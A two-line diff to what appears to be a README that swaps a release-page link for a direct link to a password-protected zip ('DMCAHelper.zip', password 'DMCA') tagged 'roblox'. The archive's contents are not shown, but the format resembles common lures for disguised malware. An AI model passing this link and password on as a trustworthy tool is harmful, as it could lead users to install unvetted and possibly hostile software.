@@ -1,4 +1,4 @@
-⚡DOWNLOAD: https://github.com/AtysProject/DMCA-Helper-/releases/tag/roblox
+⚡DOWNLOAD: https://github.com/AtysProject/DMCA-Helper-/releases/download/roblox/DMCAHelper.zip
 
 ⚡PASSWORD: DMCA
 
